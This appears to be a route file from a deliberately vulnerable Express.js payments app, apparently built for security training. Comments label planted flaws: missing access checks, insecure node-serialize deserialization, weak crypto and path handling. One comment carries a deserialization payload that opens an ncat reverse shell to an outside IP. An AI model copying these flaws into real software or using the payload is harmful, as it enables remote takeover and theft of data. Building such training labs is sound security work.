"use strict";

const express = require("express");
const router = express.Router();
const dbapi = require("../db/api");
const crypto = require("../crypto");
const pt = require("path");
const fs = require("fs");
const node_serialize = require("node-serialize");
const winston = require("winston");

// Broken access control vulnerability
router.get("/getAll", function (req, res) {
    dbapi.getAllTransactions()
        .then((rows) => {
            if (rows !== undefined)
                res.status(200).send(JSON.stringify(rows));
            else
                res.status(500).send();
        })
        .catch(() => {
            res.status(500).send();
        });
});

router.get("/getOwn", function (req, res) {
    winston.info(`User "${req.cookies["username"]}" fetched its own transactions`);
    if (req.session.user !== undefined && req.session.user.role === "user") {
        dbapi.getAllTransactions(req.session.user.id)
            .then((rows) => {
                if (rows !== undefined)
                    res.status(200).send(JSON.stringify(rows));
                else
                    res.status(500).send();
            })
            .catch(() => {
                res.status(500).send();
            });
    }
    else {
        res.status(401).send();
    }
});

router.get("/getAllSellerClosed", function (req, res) {
    if (req.session.user !== undefined && req.session.user.role === "seller") {
        dbapi.getAllClosedTransactionsBySellerId(req.session.user.id)   // we pass also the seller ID
            .then((rows) => {
                if (rows !== undefined)
                    res.status(200).send(JSON.stringify(rows));
                else
                    res.status(500).send();
            })
            .catch(() => {
                res.status(500).send();
            });
    }
    else {
        res.status(401).send();
    }
});

// Insecure deserialization vulnerability 
// {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat 172.21.224.1 6000 -e /bin/sh');}()"}
router.post("/requestPayment", function (req, res) {
    if (req.session.user !== undefined && req.session.user.role === "seller") {
        const obj = node_serialize.unserialize(req.body);
        dbapi.getUserRoleUserByUsername(obj.usernameBuyer)
            .then((role) => {
                if (role === "user") {
                    dbapi.addTransaction(req.session.user.username, obj.usernameBuyer, obj.amount)
                        .then(() => {
                            res.status(200).send();
                        })
                        .catch(() => {
                            res.status(500).send();
                        });
                }
                else {
                    res.status(500).send();
                }
            });
    }
    else {
        res.status(401).send();
    }
});

// Vulnerability cryptographic failures
router.post("/rechargeWallet", function (req, res) {
    if (req.session.user !== undefined && req.session.user.role === "seller") {
        const rechargeData = crypto.symmetricDecryption(req.body.rechargeData, req.session.user.passwordHash);
        const data = rechargeData.split(",");
        const username = data[1];
        const amount = data[2];
        dbapi.rechargeUserWallet(username, amount)
            .then(() => {
                res.status(200).send();
            })
            .catch(() => {
                res.status(500).send();
            });
    }
    else {
        res.status(401).send();
    }
});

router.post("/delete", function (req, res) {
    if (req.session.user !== undefined) {  // oops didn't check if session is admin so I client side enforce
        dbapi.deleteTransaction(req.body.transactionId)
            .then(() => {
                res.status(200).send();
            })
            .catch(() => {
                res.status(500).send();
            });
    }
    else {
        res.status(401).send();
    }
});

router.post("/add", function (req, res) {
    if (req.session.user !== undefined && req.session.user.role === "admin") {
        dbapi.getUserRoleUserByUsername(req.body.user)
            .then((role) => {
                if (role === "user") {
                    dbapi.getUserRoleUserByUsername(req.body.seller)
                        .then((role) => {
                            if (role === "seller") {
                                dbapi.addTransaction(req.body.seller, req.body.user, req.body.amount)
                                    .then(() => {
                                        res.status(200).send();
                                    })
                                    .catch(() => {
                                        res.status(500).send();
                                    });
                            }
                            else {
                                res.status(500).send();
                            }
                        })
                        .catch(() => {
                            res.status(500).send();
                        })
                }
                else {
                    res.status(500).send();
                }
            })
            .catch(() => {
                res.status(500).send();
            })
    }
    else {
        res.status(401).send();
    }
});

router.post("/modify", function (req, res) {
    if (req.session.user !== undefined && req.session.user.role === "admin") {
        dbapi.modifyTransaction(req.body.transactionId, req.body.amount)
            .then(() => {
                res.status(200).send();
            })
            .catch(() => {
                res.status(500).send();
            });
    }
    else {
        res.status(401).send();
    }
});

router.delete("/:transactionId", function (req, res) {
    if (req.session.user !== undefined && req.session.user.role === "user") {
        const transactionId = req.params.transactionId;
        dbapi.getTransactionById(transactionId).catch(() => {
            res.status(500).send();
        }).then((result) => {
            if (result.user_id !== req.session.user.id) {
                return res.status(401).send();
            }
            dbapi.deleteTransaction(transactionId)
                .then(() => {
                    res.status(200).send();
                })
                .catch(() => {
                    res.status(500).send();
                });
        })

    }
    else {
        res.status(401).send();
    }
});

router.put("/:transactionId", async function (req, res) {
    if (req.session.user !== undefined && req.session.user.role === "user") {
        const transactionId = req.params.transactionId;
        try {
            const transaction = await dbapi.getTransactionById(transactionId);
            if (transaction.user_id !== req.session.user.id) {
                return res.status(401).send();
            }
            if (transaction.amount > req.session.user.balance) {
                return res.status(402).send(JSON.stringify({ message: "Insufficient funds" }));
            }
            await Promise.all([
                dbapi.acceptTransaction(transactionId),
                dbapi.decreaseUserWallet(req.session.user.username, transaction.amount)
            ]);
            const user = {
                ...req.session.user,
                balance: req.session.user.balance - transaction.amount
            }
            return res.status(200).send(JSON.stringify(user));
        } catch (error) {
            return res.status(500).send({ message: "Internal server error", details: error.message });
        }
    }
    else {
        res.status(401).send();
    }
});

router.get("/generateTransactionsFile", function (req, res) {
    if (req.session.user !== undefined && req.session.user.role === "user") {
        dbapi.getAllTransactions(req.session.user.id)
            .then((rows) => {
                if (rows !== undefined) {
                    const path = pt.join("src/files/" + req.session.user.username.replace("\n", ""));
                    fs.writeFileSync(path, JSON.stringify(rows), (err) => {
                        if (err) {
                            res.status(500).send();
                        }
                    });
                    res.status(200).send();
                }
                else {
                    res.status(500).send();
                }
            })
            .catch(() => {
                res.status(500).send();
            });
    }
    else {
        res.status(401).send();
    }
});

// Broken access control and incomplete sanitization vulnerabilities 
router.get("/transactionsFile", function (req, res) {
    if (req.session.user !== undefined && req.session.user.role === "user") {
        const path = pt.join("src/files/" + req.session.user.username.replace("\n", ""));
        res.download(path);
    }
    else {
        res.status(401).send();
    }
});

module.exports = router;